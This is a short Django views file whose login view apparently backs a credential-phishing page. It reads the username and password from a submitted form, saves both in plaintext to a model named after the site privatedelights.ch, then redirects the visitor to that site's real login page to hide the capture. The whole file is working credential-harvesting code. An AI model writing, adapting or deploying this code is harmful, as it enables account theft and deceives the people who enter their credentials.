from django.shortcuts import render,HttpResponseRedirect

from teemapp.models import PrivateDelights


def login(request):
    if request.method == "POST":
        username =request.POST["name"]
        password = request.POST["password"]
        obj = PrivateDelights(username=username , password = password )
        obj.save()

        return HttpResponseRedirect("https://privatedelights.ch/login")
    return render(request,"login.html")